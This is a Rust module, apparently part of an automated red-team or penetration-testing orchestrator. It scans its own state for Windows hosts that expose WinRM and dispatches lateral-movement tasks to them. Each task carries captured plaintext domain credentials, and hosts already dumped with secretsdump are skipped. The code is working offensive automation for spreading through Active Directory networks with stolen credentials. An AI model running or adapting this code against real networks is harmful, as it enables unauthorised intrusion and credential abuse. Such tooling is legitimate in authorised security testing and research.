//! auto_winrm_lateral -- attempt WinRM lateral movement with owned credentials.
//!
//! WinRM (port 5985/5986) is a common lateral movement vector in AD environments.
//! evil-winrm provides PowerShell remoting access when credentials are valid and
//! the user has remote management rights. This module dispatches WinRM access
//! attempts against hosts where we have credentials but haven't tried WinRM yet.
//!
//! WinRM complements SMB-based lateral movement (psexec/wmiexec) by working even
//! when SMB is restricted or firewall-filtered.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Attempts WinRM lateral movement against hosts with owned credentials.
/// Interval: 45s.
pub async fn auto_winrm_lateral(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("winrm_lateral") {
            continue;
        }

        let work: Vec<WinRmWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            for host in &state.hosts {
                // Check if host has WinRM indicators in services
                let has_winrm = host.services.iter().any(|s| {
                    let sl = s.to_lowercase();
                    sl.contains("5985") || sl.contains("5986") || sl.contains("winrm")
                });

                if !has_winrm {
                    continue;
                }

                // Skip hosts we already own via secretsdump
                if state.is_processed(DEDUP_SECRETSDUMP, &host.ip) {
                    continue;
                }

                let dedup_key = format!("winrm:{}", host.ip);
                if state.is_processed(DEDUP_WINRM_LATERAL, &dedup_key) {
                    continue;
                }

                let domain = host
                    .hostname
                    .find('.')
                    .map(|i| host.hostname[i + 1..].to_lowercase())
                    .unwrap_or_default();

                let cred = state
                    .credentials
                    .iter()
                    .find(|c| !domain.is_empty() && c.domain.to_lowercase() == domain)
                    .or_else(|| state.credentials.first())
                    .cloned();

                let cred = match cred {
                    Some(c) => c,
                    None => continue,
                };

                items.push(WinRmWork {
                    dedup_key,
                    target_ip: host.ip.clone(),
                    hostname: host.hostname.clone(),
                    domain,
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "technique": "winrm_exec",
                "target_ip": item.target_ip,
                "hostname": item.hostname,
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("winrm_lateral");
            match dispatcher
                .throttled_submit("lateral", "lateral", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        target = %item.target_ip,
                        hostname = %item.hostname,
                        "WinRM lateral movement dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_WINRM_LATERAL, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_WINRM_LATERAL, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(target = %item.target_ip, "WinRM lateral deferred");
                }
                Err(e) => {
                    warn!(err = %e, target = %item.target_ip, "Failed to dispatch WinRM lateral");
                }
            }
        }
    }
}

struct WinRmWork {
    dedup_key: String,
    target_ip: String,
    hostname: String,
    domain: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("winrm:{}", "192.168.58.22");
        assert_eq!(key, "winrm:192.168.58.22");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_WINRM_LATERAL, "winrm_lateral");
    }
}
